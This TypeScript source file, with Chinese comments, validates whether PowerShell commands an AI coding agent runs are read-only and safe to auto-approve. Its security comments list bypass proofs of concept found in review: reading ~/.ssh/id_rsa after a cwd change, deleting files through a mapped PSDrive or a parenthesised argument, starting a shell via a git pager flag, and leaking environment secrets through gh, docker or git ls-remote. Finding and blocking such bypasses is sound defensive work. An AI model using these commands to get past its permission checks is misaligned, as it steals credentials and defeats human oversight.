    lower = lower.replace(WINDOWS_PATHEXT, '')
  }
  const alias = COMMON_ALIASES[lower]
  if (alias) {
    return alias.toLowerCase()
  }
  return lower
}

/**
 * 检查命令名（别名解析之后）是否会改变同一复合命令中
 * 后续语句的路径解析命名空间。
 *
 * 覆盖两类：
 * 1. 更改 cwd 的 cmdlet：Set-Location、Push-Location、Pop-Location（以及
 *    别名 cd、sl、chdir、pushd、popd）。后续相对路径会基于
 *    新的 cwd 解析。
 * 2. 创建 PSDrive 的 cmdlet：New-PSDrive（以及 Windows 上的别名 ndr、mount）。
 *    后续带驱动器前缀的路径（p:/foo）会通过新的驱动器根
 *    解析，而不是通过文件系统。发现 #21：`New-PSDrive -Name p -Root /etc;
 *    Remove-Item p:/passwd`——校验器无法知道 p: 映射到 /etc。
 *
 * 任何包含上述命令的复合命令，其后续语句的相对路径/带驱动器前缀
 * 路径都无法基于失效的校验器 cwd 进行校验。
 *
 * 名称保留以与 BashTool 对齐（isCwdChangingCmdlet ↔ compoundCommandHasCd）；
 * 语义上它表示“改变路径解析命名空间”。
 */
export function isCwdChangingCmdlet(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return (
    canonical === 'set-location' ||
    canonical === 'push-location' ||
    canonical === 'pop-location' ||
    // New-PSDrive 会创建驱动器映射，把 <name>:/... 路径重定向
    // 到任意文件系统根。别名 ndr/mount 不在
    // COMMON_ALIASES 中——需显式检查（发现 #21）。
    canonical === 'new-psdrive' ||
    // ndr/mount 仅在 Windows 上是 New-PSDrive 的 PS 别名。在 POSIX 上，
    // 'mount' 是原生的 mount(8) 命令；把它当作创建 PSDrive
    // 会产生误判。（bug #15 / 评审小意见）
    (getPlatform() === 'windows' &&
      (canonical === 'ndr' || canonical === 'mount'))
  )
}

/**
 * 检查命令名（别名解析之后）是否为安全的输出 cmdlet。
 */
export function isSafeOutputCommand(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return SAFE_OUTPUT_CMDLETS.has(canonical)
}

/**
 * 检查某个命令元素是否为从 SAFE_OUTPUT_CMDLETS 移到
 * CMDLET_ALLOWLIST 的管道尾部变换器（PIPELINE_TAIL_CMDLETS 集合），
 * 且通过 isAllowlistedCommand 通过了其 argLeaksValue 守卫。
 *
 * 这是为 isSafeOutputCommand 调用点提供的窄范围回退，这些调用点需要对
 * Format-Table / Select-Object 等保留“跳过无害管道尾部”的行为。
 * 不会匹配整个 CMDLET_ALLOWLIST——只匹配迁移过来的变换器。
 */
export function isAllowlistedPipelineTail(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  const canonical = resolveToCanonical(cmd.name)
  if (!PIPELINE_TAIL_CMDLETS.has(canonical)) {
    return false
  }
  return isAllowlistedCommand(cmd, originalCommand)
}

/**
 * 只读自动放行的失败即拒绝门禁。仅当 PipelineAst 的每个元素
 * 都是 CommandAst 时才返回 true——这是唯一能被完整校验的
 * 语句形态。其他一切（赋值、控制流、表达式源、链式操作符）
 * 默认返回 false。
 *
 * 只有一条通往 true 的代码路径。PowerShell 新增的 AST 类型
 * 在结构上都会落到 false。
 */
export function isProvablySafeStatement(stmt: ParsedStatement): boolean {
  if (stmt.statementType !== 'PipelineAst') return false
  // 空命令 → 会空洞地通过下面的循环。PowerShell 的
  // 解析器保证合法源码的 PipelineAst.PipelineElements ≥ 1，
  // 但此门禁是关键所在——需防御解析器/JSON 的边界情况。
  if (stmt.commands.length === 0) return false
  for (const cmd of stmt.commands) {
    if (cmd.elementType !== 'CommandAst') return false
  }
  return true
}

/**
 * 在允许列表中查找命令，先解析别名。
 * 找到则返回配置，否则返回 undefined。
 */
function lookupAllowlist(name: string): CommandConfig | undefined {
  const lower = name.toLowerCase()
  // 先做直接查找
  const direct = CMDLET_ALLOWLIST[lower]
  if (direct) {
    return direct
  }
  // 将别名解析为规范名后再查找
  const canonical = resolveToCanonical(lower)
  if (canonical !== lower) {
    return CMDLET_ALLOWLIST[canonical]
  }
  return undefined
}

/**
 * 同步的、基于正则的检查，用于发现 PowerShell 命令中涉及安全的模式。
 * 由 isReadOnly（必须同步）在 cmdlet 允许列表检查之前作为快速
 * 预过滤使用。这对应 BashTool 的 checkReadOnlyConstraints，
 * 后者在评估只读状态之前先检查 bashCommandIsSafe_DEPRECATED。
 *
 * 若命令包含表明其不应被视为只读的模式，则返回 true，
 * 即使该 cmdlet 在允许列表中。
 */
export function hasSyncSecurityConcerns(command: string): boolean {
  const trimmed = command.trim()
  if (!trimmed) {
    return false
  }

  // 子表达式：$(...) 可执行任意代码
  if (/\$\(/.test(trimmed)) {
    return true
  }

  // 展开（splatting）：@variable 会传入任意参数。真正的展开
  // 只出现在 token 起始处——`@` 前面是空白/分隔符/串首，而不是词中。
  // `[^\w.]` 排除单词字符和 `.`，因此 `user@example.com`（邮箱）和
  // `file.@{u}` 不会匹配，而 ` @splat` / `;@splat` / `^@splat` 会匹配。
  if (/(?:^|[^\w.])@\w+/.test(trimmed)) {
    return true
  }

  // 成员调用：.Method() 可调用任意 .NET 方法
  if (/\.\w+\s*\(/.test(trimmed)) {
    return true
  }

  // 赋值：$var = ... 可修改状态
  if (/\$\w+\s*[+\-*/]?=/.test(trimmed)) {
    return true
  }

  // 停止解析符号：--% 会把所有内容原样传给原生命令
  if (/--%/.test(trimmed)) {
    return true
  }

  // UNC 路径：\\server\share 或 //server/share 可能触发网络请求
  // 并泄露 NTLM/Kerberos 凭据
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() with atom search, short command strings
  if (/\\\\/.test(trimmed) || /(?<!:)\/\//.test(trimmed)) {
    return true
  }

  // 静态方法调用：[Type]::Method() 可调用任意 .NET 方法
  if (/::/.test(trimmed)) {
    return true
  }

  return false
}

/**
 * 根据 cmdlet 允许列表检查 PowerShell 命令是否为只读。
 *
 * @param command - 原始 PowerShell 命令字符串
 * @param parsed - 命令的 AST 解析结果
 * @returns 命令只读时返回 true，否则返回 false
 */
export function isReadOnlyCommand(
  command: string,
  parsed?: ParsedPowerShellCommand,
): boolean {
  const trimmedCommand = command.trim()
  if (!trimmedCommand) {
    return false
  }

  // 若无解析后的 AST 可用，保守地返回 false
  if (!parsed) {
    return false
  }

  // 若解析失败，则拒绝
  if (!parsed.valid) {
    return false
  }

  const security = deriveSecurityFlags(parsed)
  // 拒绝包含脚本块的命令——我们无法验证其中的代码
  // 例如 Get-Process | ForEach-Object { Remove-Item C:\foo } 看起来是安全管道
  // 但脚本块中包含破坏性代码
  if (
    security.hasScriptBlocks ||
    security.hasSubExpressions ||
    security.hasExpandableStrings ||
    security.hasSplatting ||
    security.hasMemberInvocations ||
    security.hasAssignments ||
    security.hasStopParsing
  ) {
    return false
  }

  const segments = getPipelineSegments(parsed)

  if (segments.length === 0) {
    return false
  }

  // SECURITY: 拦截同时包含更改 cwd 的 cmdlet
  // （Set-Location/Push-Location/Pop-Location/New-PSDrive）与任何其他语句的
  // 复合命令。此前该限制仅针对 cd+git，但忽略了
  // cd+读取 类复合命令的 isReadOnlyCommand 自动放行路径（发现 #27）：
  //   Set-Location ~; Get-Content ./.ssh/id_rsa
  // 两个 cmdlet 都在 CMDLET_ALLOWLIST 中，因此没有这道守卫时该复合命令
  // 会被自动放行。路径校验会基于失效的
  // 校验器 cwd（例如 /project）解析 ./.ssh/id_rsa，从而漏掉任何 Read(~/.ssh/**) 拒绝规则。
  // 而运行时 PowerShell 会 cd 到 ~，读取 ~/.ssh/id_rsa。
  //
  // 任何包含更改 cwd 的 cmdlet 的复合命令，在其他语句可能使用相对路径时
  // 都不能被自动归类为只读——这些路径
  // 在运行时的解析结果与校验时不同。BashTool 有
  // 等效的守卫，通过 compoundCommandHasCd 传入路径校验。
  const totalCommands = segments.reduce(
    (sum, seg) => sum + seg.commands.length,
    0,
  )
  if (totalCommands > 1) {
    const hasCd = segments.some(seg =>
      seg.commands.some(cmd => isCwdChangingCmdlet(cmd.name)),
    )
    if (hasCd) {
      return false
    }
  }

  // 逐条检查每个语句——全部必须是只读的
  for (const pipeline of segments) {
    if (!pipeline || pipeline.commands.length === 0) {
      return false
    }

    // 拒绝文件重定向（写入文件）。`> $null` 会丢弃输出，
    // 不是文件系统写入，因此不影响只读状态。
    if (pipeline.redirections.length > 0) {
      const hasFileRedirection = pipeline.redirections.some(
        r => !r.isMerging && !isNullRedirectionTarget(r.target),
      )
      if (hasFileRedirection) {
        return false
      }
    }

    // 第一条命令必须在允许列表中
    const firstCmd = pipeline.commands[0]
    if (!firstCmd) {
      return false
    }

    if (!isAllowlistedCommand(firstCmd, command)) {
      return false
    }

    // 管道中其余命令必须是安全的输出 cmdlet，或已在允许列表中
    // （并经过参数校验）。安全审查发现 Format-Table/Measure-Object 都
    // 接受计算属性哈希表，因此将其从
    // SAFE_OUTPUT_CMDLETS 移到 CMDLET_ALLOWLIST。isAllowlistedCommand 会运行它们的
    // argLeaksValue 回调：裸 `| Format-Table` 通过，`| Format-Table
    // $env:SECRET` 失败。SECURITY: nameType 门禁可捕获 'scripts\\Out-Null'
    // （原始名称含路径字符 → 'application'）。cmd.name 会被剥离为
    // 'Out-Null'，本可匹配 SAFE_OUTPUT_CMDLETS，但 PowerShell 实际运行的是
    // scripts\\Out-Null.ps1。
    for (let i = 1; i < pipeline.commands.length; i++) {
      const cmd = pipeline.commands[i]
      if (!cmd || cmd.nameType === 'application') {
        return false
      }
      // SECURITY: isSafeOutputCommand 仅按名称；只对无参数调用做短路。
      // Out-String -InputObject:(rm x)——该括号会在 Out-String 运行时
      // 被求值。若只按名称检查且带参数，冒号绑定的括号会绕过检查。
      // 因此在有参数时强制走 isAllowlistedCommand（参数校验）——
      // Out-String/Out-Null/Out-Host 不在
      // CMDLET_ALLOWLIST 中，所以任何参数都会被拒绝。
      //   PoC: Get-Process | Out-String -InputObject:(Remove-Item /tmp/x)
      //   → 自动放行 → Remove-Item 执行。
      if (isSafeOutputCommand(cmd.name) && cmd.args.length === 0) {
        continue
      }
      if (!isAllowlistedCommand(cmd, command)) {
        return false
      }
    }

    // SECURITY: 拒绝包含嵌套命令的语句。nestedCommands 是
    // 脚本块参数内部、冒号绑定参数的 ParenExpressionAst
    // 子节点，或其他非顶层位置中出现的 CommandAst 节点。
    // 含 nestedCommands 的语句按定义就不是简单的只读
    // 调用——它包含可执行的子管道，会绕过
    // 上面的逐命令允许列表检查。
    if (pipeline.nestedCommands && pipeline.nestedCommands.length > 0) {
      return false
    }
  }

  return true
}

/**
 * 检查单个命令元素是否在允许列表中并通过标志校验。
 */
export function isAllowlistedCommand(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  // SECURITY: nameType 由原始名称（stripModulePrefix 之前）计算得出。
  // 'application' 表示原始名称包含路径字符（. \\ /）——例如
  // 'scripts\\Get-Process'、'./git'、'node.exe'。PowerShell 会把它们解析为
  // 文件路径，而不是剥离后名称所匹配的 cmdlet/命令。绝不
  // 自动放行：允许列表是为 cmdlet 构建的，不是为任意脚本。
  // 已知的附带影响：'Microsoft.PowerShell.Management\\Get-ChildItem' 也会
  // 被归类为 'application'（含 . 和 \\）并触发弹窗。可以接受，
  // 因为实践中模块限定名很少见，且弹窗是安全的。
  if (cmd.nameType === 'application') {
    // 对显式安全 .exe 名称的绕行（与 bash 的 `which` 对齐——见
    // SAFE_EXTERNAL_EXES）。SECURITY: 匹配 cmd.text 的原始首个 token，
    // 而不是 cmd.name。stripModulePrefix 会把 scripts\where.exe 折叠为
    // cmd.name='where.exe'，但 cmd.text 保留 'scripts\where.exe ...'。
    const rawFirstToken = cmd.text.split(/\s/, 1)[0]?.toLowerCase() ?? ''
    if (!SAFE_EXTERNAL_EXES.has(rawFirstToken)) {
      return false
    }
    // 落到 lookupAllowlist——CMDLET_ALLOWLIST['where.exe'] 负责
    // 标志校验（配置为空 = 所有标志都放行，与 bash 的 `which` 一致）。
  }

  const config = lookupAllowlist(cmd.name)
  if (!config) {
    return false
  }

  // 若存在正则约束，则针对原始命令检查
  if (config.regex && !config.regex.test(originalCommand)) {
    return false
  }

  // 若存在额外的回调，则调用它检查
  if (config.additionalCommandIsDangerousCallback?.(originalCommand, cmd)) {
    return false
  }

  // SECURITY: 白名单校验参数的 elementTypes——只有 StringConstant 和 Parameter
  // 可以被静态验证。其他一切都会在运行时展开/求值：
  //   'Variable'          → `Get-Process $env:AWS_SECRET_ACCESS_KEY` 会展开，
  //                         报错 "Cannot find process 'sk-ant-...'"，模型
  //                         从错误中读到密钥
  //   'Other' (Hashtable) → `Get-Process @{k=$env:SECRET}` 同样泄露
  //   'Other' (Convert)   → `Get-Process [string]$env:SECRET` 同样泄露
  //   'Other' (BinaryExpr)→ `Get-Process ($env:SECRET + '')` 同样泄露
  //   'SubExpression'     → 任意代码（已由 isReadOnlyCommand 层的
  //                         deriveSecurityFlags 捕获，但 isAllowlistedCommand
  //                         也会被 checkPermissionMode 直接调用）
  // hasSyncSecurityConcerns 漏掉裸 $var（只匹配 `$(`/@var/.Method(/
  // $var=/--%/::）；deriveSecurityFlags 没有 'Variable' 分支；下面的 safeFlags
  // 循环校验标志名，但不校验位置参数的类型。文件类 cmdlet
  // （CMDLET_PATH_CONFIG）已由 pathValidation.ts 中的 SAFE_PATH_ELEMENT_TYPES
  // 保护——这里补上非文件类 cmdlet（Get-Process、
  // Get-Service、Get-Command 等约 15 个）的缺口。相当于 Bash 在
  // BashTool/readOnlyValidation.ts:~1356 处的一揽子 `$` token 检查。
  //
  // 位置：在外部命令分发之前，使 git/gh/docker/dotnet 也能享受
  // 该保护（与其基于字符串的 `$` 检查形成纵深防御；可捕获
  // `$` 子串检查漏掉的 @{...}/[cast]/($a+$b)）。在 PS 参数模式下，
  // 裸 `5` 会被词法分析为 StringConstant（BareWord），而不是数字字面量，
  // 因此 `git log -n 5` 能通过。
  //
  // SECURITY: elementTypes 为 undefined → 失败即拒绝。真正的解析器总会
  // 设置它（parser.ts:769/781/812），因此 undefined 意味着元素不可信或
  // 格式错误。此前为了测试辅助工具的便利会跳过（失败即放行）；
  // 现在测试辅助工具会显式设置 elementTypes。
  // elementTypes[0] 是命令名；参数从 elementTypes[1] 开始。
  if (!cmd.elementTypes) {
    return false
  }
  {
    for (let i = 1; i < cmd.elementTypes.length; i++) {
      const t = cmd.elementTypes[i]
      if (t !== 'StringConstant' && t !== 'Parameter') {
        // ArrayLiteralAst（`Get-Process Name, Id`）映射为 'Other'。上面
        // 枚举的泄露途径在其 extent 文本中都有一个元字符：
        // Hashtable 的 `@{`、Convert 的 `[`、含变量的 BinaryExpr 的 `$`、
        // ParenExpr 的 `(`。由裸标识符组成的逗号列表则都没有。
        if (!/[$(@{[]/.test(cmd.args[i - 1] ?? '')) {
          continue
        }
        return false
      }
      // 冒号绑定的参数（`-Flag:$env:SECRET`）是单个
      // CommandParameterAst——其中的 VariableExpressionAst 是它的 .Argument
      // 子节点，而不是独立的 CommandElement，因此 elementTypes 显示为 'Parameter'，
      // 上面的白名单会通过。
      //
      // 改为查询解析器的 children[] 树，而不是对参数文本做
      // 字符串考古。children[i-1] 保存 .Argument
      // 子节点映射后的类型（与 args[i-1] 对齐）。
      // 树查询比字符串检查能捕获更多情况——例如
      // `-InputObject:@{k=v}`（HashtableAst → 'Other'，文本中没有 `$`）、
      // `-Name:('payload' > file)`（带重定向的 ParenExpressionAst）。
      // 当 children 为 undefined 时回退到扩展的元字符检查
      // （向后兼容 / 未设置它的测试辅助工具）。
      if (t === 'Parameter') {
        const paramChildren = cmd.children?.[i - 1]
        if (paramChildren) {
          if (paramChildren.some(c => c.type !== 'StringConstant')) {
            return false
          }
        } else {
          // 回退：对参数文本做字符串考古（适用于尚未提供 children 的解析器）。
          // 拒绝 `$`（变量）、`(`（ParenExpressionAst）、`@`（哈希/数组
          // 下标）、`{`（scriptblock）、`[`（类型字面量/静态方法）。
          const arg = cmd.args[i - 1] ?? ''
          const colonIdx = arg.indexOf(':')
          if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
            return false
          }
        }
      }
    }
  }

  const canonical = resolveToCanonical(cmd.name)

  // 通过共享校验处理外部命令
  if (
    canonical === 'git' ||
    canonical === 'gh' ||
    canonical === 'docker' ||
    canonical === 'dotnet'
  ) {
    return isExternalCommandSafe(canonical, cmd.args)
  }

  // 在 Windows 上，/ 是原生命令合法的标志前缀（例如 findstr /S）。
  // 但 PowerShell cmdlet 始终使用 - 前缀的参数，因此 /tmp 是路径，
  // 而不是标志。我们通过检查命令是否解析为
  // 动词-名词形式的规范名（直接解析或经别名解析）来判断它是否为 cmdlet。
  const isCmdlet = canonical.includes('-')

  // SECURITY: 若设置了 allowAllFlags，则跳过标志校验（该命令的整个
  // 标志面都是只读的）。否则，缺失/空的 safeFlags 意味着
  // “仅允许位置参数，拒绝所有标志”——而不是“接受一切”。
  if (config.allowAllFlags) {
    return true
  }
  if (!config.safeFlags || config.safeFlags.length === 0) {
    // 未定义 safeFlags 且未设置 allowAllFlags：拒绝任何标志。
    // 仅位置参数仍被允许（下面的循环不会触发）。
    // 这是安全的默认行为——命令必须显式选择接受标志。
    const hasFlags = cmd.args.some((arg, i) => {
      if (isCmdlet) {
        return isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      }
      return (
        arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
      )
    })
    return !hasFlags
  }

  // 校验所有用到的标志都在允许列表中。
  // SECURITY: 以 elementTypes 作为参数检测的
  // 事实依据。PowerShell 的词法分析器接受 en-dash/
  // em-dash/horizontal-bar（U+2013/2014/2015）作为参数前缀；直接用
  // startsWith('-') 检查会漏掉 `–ComputerName`（en-dash）。解析器无论
  // 破折号字符是什么，都会把 CommandParameterAst 映射为 'Parameter'。
  // elementTypes[0] 是名称元素；参数从 elementTypes[1] 开始。
  for (let i = 0; i < cmd.args.length; i++) {
    const arg = cmd.args[i]!
    // 对于 cmdlet：信任 elementTypes（AST 的事实依据，可捕获 Unicode 破折号）。
    // 对于 Windows 上的原生 exe：还需检查 `/` 前缀（argv 约定，而非
    // 词法分析器——解析器把 `/S` 视为位置参数，而非 CommandParameterAst）。
    const isFlag = isCmdlet
      ? isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      : arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
    if (isFlag) {
      // 对于 cmdlet，将 Unicode 破折号归一化为 ASCII 连字符以便与 safeFlags
      // 比较（safeFlags 条目始终使用 ASCII `-` 书写）。
      // 原生 exe 的 safeFlags 以 `/` 存储（例如 '/FO'）——不要改动。
      let paramName = isCmdlet ? '-' + arg.slice(1) : arg
      const colonIndex = paramName.indexOf(':')
      if (colonIndex > 0) {
        paramName = paramName.substring(0, colonIndex)
      }

      // -ErrorAction/-Verbose/-Debug 等由每个 cmdlet 通过
      // [CmdletBinding()] 接受，且只路由错误/警告/进度流——
      // 它们无法让只读 cmdlet 产生写入。pathValidation.ts 已
      // 把它们合并进各 cmdlet 的参数集（约第 1339 行）；这里
      // 对 safeFlags 做同样的合并。若没有这一步，`Get-Content file.txt
      // -ErrorAction SilentlyContinue` 会弹窗，尽管 Get-Content 已在
      // 允许列表中。仅适用于 cmdlet——原生 exe 没有通用参数。
      const paramLower = paramName.toLowerCase()
      if (isCmdlet && COMMON_PARAMETERS.has(paramLower)) {
        continue
      }
      const isSafe = config.safeFlags.some(
        flag => flag.toLowerCase() === paramLower,
      )
      if (!isSafe) {
        return false
      }
    }
  }

  return true
}

// ---------------------------------------------------------------------------
// 使用共享配置的外部命令校验（git、gh、docker）
// ---------------------------------------------------------------------------

function isExternalCommandSafe(command: string, args: string[]): boolean {
  switch (command) {
    case 'git':
      return isGitSafe(args)
    case 'gh':
      return isGhSafe(args)
    case 'docker':
      return isDockerSafe(args)
    case 'dotnet':
      return isDotnetSafe(args)
    default:
      return false
  }
}

const DANGEROUS_GIT_GLOBAL_FLAGS = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  // SECURITY: --attr-source 会造成解析器差异。Git 会把
  // tree-ish 值之后的 token 视为 pathspec（而非子命令），但
  // 我们的跳过 2 个 token 的循环会把它当作子命令：
  //   git --attr-source HEAD~10 log status
  //   校验器：越过 HEAD~10，看到 subcmd=log → 放行
  //   git：      把 `log` 当作 pathspec 消耗掉，实际运行 `status` 作为真正的子命令
  // 已用 `GIT_TRACE=1 git --attr-source HEAD~10 log status` 验证 →
  // `trace: built-in: git status`。因此直接拒绝，而不是跳过 2 个 token。
  '--attr-source',
])

// 接受单独（空格分隔）取值参数的 Git 全局标志。
// 当循环遇到没有内联 `=` 值的这类标志时，必须跳过
// 下一个 token，以免该值被误认为子命令。
//
// SECURITY: 该集合必须完整。任何未列在此处的耗值全局标志
// 都会造成解析器差异：校验器把该值视为
// 子命令，git 消耗该值并运行下一个 token。已针对 git 2.51 用
// `man git` + GIT_TRACE 审计；--list-cmds 只支持 `=`，布尔型标志
// （-p/--bare/--no-*/--*-pathspecs/--html-path 等）走默认路径前进 1 个 token。
// --attr-source 已移除：它也会触发 pathspec 解析，
// 造成第二种差异——已移到上面的 DANGEROUS_GIT_GLOBAL_FLAGS。
const GIT_GLOBAL_FLAGS_WITH_VALUES = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--shallow-file',
])

// 接受紧连形式取值的 Git 短全局标志（标志字母与值之间无空格）。
// 长选项（--git-dir 等）要求 `=` 或空格，
// 因此按 `=` 切分的检查能处理它们。但 `-ccore.pager=sh` 和 `-C/path`
// 需要前缀匹配：git 直接解析 `-c<name>=<value>` 和 `-C<path>`。
const DANGEROUS_GIT_SHORT_FLAGS_ATTACHED = ['-c', '-C']

function isGitSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // SECURITY: 拒绝任何含 `$`（变量引用）的参数。裸的
  // VariableExpressionAst 位置参数会以字面文本（$env:SECRET、
  // $VAR）到达这里。deriveSecurityFlags 不会拦截裸 Variable 参数。校验器
  // 把 `$VAR` 视为文本；PowerShell 在运行时展开它。解析器差异：
  //   git diff $VAR   其中 $VAR = '--output=/tmp/evil'
  //   → 校验器看到位置参数 '$VAR' → validateFlags 通过
  //   → PowerShell 运行 `git diff --output=/tmp/evil` → 写文件
  // 这把下面 ls-remote 的内联 `$` 守卫推广到所有 git 子命令。
  // Bash 中的对应做法：BashTool 在
  // readOnlyValidation.ts:~1352 处一揽子拒绝 `$`。isGhSafe 有相同的守卫。
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  // 跳过子命令之前的全局标志，并拒绝危险的标志。
  // 接受空格分隔取值的标志必须消耗下一个 token，以免它
  // 被误认为子命令（例如 `git --namespace foo status`）。
  let idx = 0
  while (idx < args.length) {
    const arg = args[idx]
    if (!arg || !arg.startsWith('-')) {
      break
    }
    // SECURITY: 紧连形式的短标志。`-ccore.pager=sh` 按 `=` 切分为
    // `-ccore.pager`，它不在 DANGEROUS_GIT_GLOBAL_FLAGS 中。Git 接受
    // 无空格的 `-c<name>=<value>` 和 `-C<path>`。因此必须做前缀匹配。
    // 注意：`--cached`、`--config-env` 等在位置 1 就无法通过
    // startsWith('-c')（`-` ≠ `c`）。`!== '-'` 守卫只适用于 `-c`
    // （git 配置键从不以 `-` 开头，因此 `-c-key` 不太可能）。
    // 它不适用于 `-C`——目录路径可以以 `-` 开头，因此
    // `git -C-trap status` 必须拒绝。`git -ccore.pager=sh log` 会启动 shell。
    for (const shortFlag of DANGEROUS_GIT_SHORT_FLAGS_ATTACHED) {
      if (
        arg.length > shortFlag.length &&
        arg.startsWith(shortFlag) &&
        (shortFlag === '-C' || arg[shortFlag.length] !== '-')
      ) {
        return false
      }
    }
    const hasInlineValue = arg.includes('=')
    const flagName = hasInlineValue ? arg.split('=')[0] || '' : arg
    if (DANGEROUS_GIT_GLOBAL_FLAGS.has(flagName)) {
      return false
    }
    // 若该标志接受单独取值，则消耗下一个 token
    if (!hasInlineValue && GIT_GLOBAL_FLAGS_WITH_VALUES.has(flagName)) {
      idx += 2
    } else {
      idx++
    }
  }

  if (idx >= args.length) {
    return true
  }

  // 先尝试多词子命令（例如 'stash list'、'config --get'、'remote show'）
  const first = args[idx]?.toLowerCase() || ''
  const second = idx + 1 < args.length ? args[idx + 1]?.toLowerCase() || '' : ''

  // GIT_READ_ONLY_COMMANDS 的键形如 'git diff'、'git stash list'
  const twoWordKey = `git ${first} ${second}`
  const oneWordKey = `git ${first}`

  let config: ExternalCommandConfig | undefined =
    GIT_READ_ONLY_COMMANDS[twoWordKey]
  let subcommandTokens = 2

  if (!config) {
    config = GIT_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(idx + subcommandTokens)

  // git ls-remote 的 URL 拒绝——移植自 BashTool 的内联守卫
  // （src/tools/BashTool/readOnlyValidation.ts:~962）。带 URL 的 ls-remote
  // 是数据外泄途径（把密钥编码进主机名 → DNS/HTTP）。
  // 拒绝类 URL 的位置参数：`://`（http/git 协议）、`@` + `:`（SSH 的
  // git@host:path）以及 `$`（变量引用——当参数的 elementType 为 Variable 时，
  // $env:URL 会以字面字符串 '$env:URL' 到达这里；
  // 安全标志检查不会拦截传给
  // 外部命令的裸 Variable 位置参数）。
  if (first === 'ls-remote') {
    for (const arg of flagArgs) {
      if (!arg.startsWith('-')) {
        if (
          arg.includes('://') ||
          arg.includes('@') ||
          arg.includes(':') ||
          arg.includes('$')
        ) {
          return false
        }
      }
    }
  }

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config, { commandName: 'git' })
}

function isGhSafe(args: string[]): boolean {
  // gh 命令依赖网络；仅对 ant 用户放行
  if (true) {
    return false
  }

  if (args.length === 0) {
    return true
  }

  // 先尝试两词子命令（例如 'pr view'）
  let config: ExternalCommandConfig | undefined
  let subcommandTokens = 0

  if (args.length >= 2) {
    const twoWordKey = `gh ${args[0]?.toLowerCase()} ${args[1]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[twoWordKey]
    subcommandTokens = 2
  }

  // 尝试单词子命令（例如 'gh version'）
  if (!config && args.length >= 1) {
    const oneWordKey = `gh ${args[0]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(subcommandTokens)

  // SECURITY: 拒绝任何含 `$`（变量引用）的参数。裸的
  // VariableExpressionAst 位置参数会以字面文本（$env:SECRET）到达这里。
  // deriveSecurityFlags 不会拦截裸 Variable 参数——只拦截子表达式、
  // 展开（splatting）、可扩展字符串等。所有 gh 子命令都面向网络，
  // 因此变量参数是数据外泄途径：
  //   gh search repos $env:SECRET_API_KEY
  //   → PowerShell 在运行时展开 → 密钥被发送到 GitHub API。
  // git ls-remote 有等效的内联守卫；这里把它推广到 gh。
  // Bash 中的对应做法：BashTool 在 readOnlyValidation.ts:~1352 处一揽子拒绝 `$`。
  for (const arg of flagArgs) {
    if (arg.includes('$')) {
      return false
    }
  }
  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

function isDockerSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // SECURITY: 一揽子拒绝 PowerShell 中的 `$` 变量。与
  // isGitSafe 和 isGhSafe 相同的守卫。解析器差异：校验器看到字面量
  // '$env:X'；PowerShell 在运行时展开。在快速路径返回之前
  // 运行——此前的位置（快速路径之后）对
  // `docker ps`/`docker images` 从未触发。早先声称它们不接受
  // --format 的注释是错的：`docker ps --format $env:AWS_SECRET_ACCESS_KEY`
  // 被自动放行，PowerShell 展开，docker 报错并在
  // 输出中带上密钥，模型读到了它。检查所有参数，而不只是 flagArgs——args[0]
  // （子命令槽位）也可能是 `$env:X`。elementTypes 白名单在此
  // 不适用：该函数接收 string[]（已字符串化），而非
  // ParsedCommandElement；isAllowlistedCommand 调用方会在上一层应用
  // elementTypes 门禁。
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  const oneWordKey = `docker ${args[0]?.toLowerCase()}`

  // 快速路径：EXTERNAL_READONLY_COMMANDS 条目（'docker ps'、'docker images'）
  // 没有标志约束——无条件放行（在上面的 $ 守卫之后）。
  if (EXTERNAL_READONLY_COMMANDS.includes(oneWordKey)) {
    return true
  }

  // DOCKER_READ_ONLY_COMMANDS 条目（'docker logs'、'docker inspect'）有
  // 逐标志的配置。对应 isGhSafe：先查配置，再 validateFlags。
  const config: ExternalCommandConfig | undefined =
    DOCKER_READ_ONLY_COMMANDS[oneWordKey]
  if (!config) {
    return false
  }

  const flagArgs = args.slice(1)

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

function isDotnetSafe(args: string[]): boolean {
  if (args.length === 0) {
    return false
  }

  // dotnet 使用顶层标志，如 --version、--info、--list-runtimes
  // 所有参数都必须在安全集合中
  for (const arg of args) {
    if (!DOTNET_READ_ONLY_FLAGS.has(arg.toLowerCase())) {
      return false
    }
  }

  return true
}
